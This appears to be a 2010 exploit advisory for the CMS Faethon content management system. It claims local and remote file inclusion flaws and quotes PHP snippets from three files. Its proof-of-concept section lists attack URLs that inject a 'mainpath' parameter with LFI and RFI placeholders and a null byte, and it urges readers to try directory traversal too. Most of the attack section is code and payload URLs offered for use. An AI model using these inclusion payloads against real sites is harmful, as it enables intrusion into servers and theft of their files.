@@ -1,0 +1,98 @@
+#####################################################################################
+	cmsfaethon-2.2.0-ultimate.7z Multiple Vulnerability
+#####################################################################################
+
+[+]Vendor: 	CMS Faethon
+[+]Version: 	2.2.0-ultimate.7z
+[+]License: 	GNU GENERAL PUBLIC LICENSE
+[+]Download:	http://sourceforge.net/projects/cmsfaethon/files/
+[+]Risk: 	High
+[+]Remote:	Yes
+[+]Local:	Yes
+[+]Vulnerable:	Since v1.12
+		CMS Faethon 1.3 (CMS Faethon 1.3-Ultimed to  cmsfaethon-1.3.5-ultimate.7z)
+		CMS Faethon 2.0 (cmsfaethon-2.0-ultimate.7 to CMS Faethon 2.0.5 Blog Edition )
+		CMS Faethon 2.2.0 Ultimate
+		
+###########################################################
+[+]Author:	eidelweiss
+[+]Contact:	eidelweiss[at]cyberservices[dot]com
+[+]Date:	March 26 2010 (published march 27)
+[+]Thank`s:	sp3x (securityreason) - JosS (hack0wn) - r0073r & 0x1D (inj3ct0r)
+[+]Special:	[D]eal [C]yber - syabilla_putri (i miss u to) 
+###########################################################
+
+####################
+
+
+-=[Description]=-
+
+
+CMS Faethon is content management system for different web pages.
+
+	CMS Faethon 2.2
+	  
+	This program is free software; you can redistribute it and/or
+	modify it under the terms of the GNU General Public License
+	as published by the Free Software Foundation; either version 2
+	of the License, or (at your option) any later version.
+
+####################
+
+-=[ VULN & =[P0C]= C0de ]=-
+
+####################
+	$File: admin/index.php
+####################
+
+***/
+
+session_start();
+$mainpath = "./";
+include($mainpath .'../lib/functions_SQL.php'); 
+include($mainpath .'../lib/functions_DATE.php');
+include($mainpath .'../lib/class_multilang.php');
+include($mainpath .'../lib/class_menu.php');
+if($_GET['cmd'] != 'acp' || ($_GET['cmd'] == 'acp' && isset($_SESSION['auth_key']))) {
+	include($mainpath .'header.php');
+} else {
+	include($mainpath .'config.php'); // possible Lfi here
+	include($mainpath .'auth.php');
+}
+
+####################
+	$File: mobile/index.php
+####################
+
+
+require('../config.php');
+include('../lang/'.$cfg['lang'].'.inc');
+$mainpath = "./";
+$title = "Titulní strana";
+include($mainpath . 'header.php');
+
+####################
+	$File: admin/articles/edit.php
+####################
+
+if(!isset($_GET['cmd'])) { 
+	$mainpath = "../"; 
+	include($mainpath . '../lib/functions_SQL.php');
+	include($mainpath . 'header.php') ;
+
+
+-=[P0C]=-
+
+	http://127.0.0.1/[cms_faethon_path]/admin/index.php?mainpath=[LFI]%00
+	
+	http://127.0.0.1/[cms_faethon_path]/admin/articles/edit.php?mainpath=[RFI]
+
+	http://127.0.0.1/[cms_faethon_path]/mobile/index.php?mainpath=[RFI]
+	
+	etc,etc,etc !!!
+
+	so many vulnerability in this project 
+	(I also saw possibility Directory Traversal vulnerability , use your skill and play your imaginasion)
+
+
+###########################################################=[E0F]=###########################################################
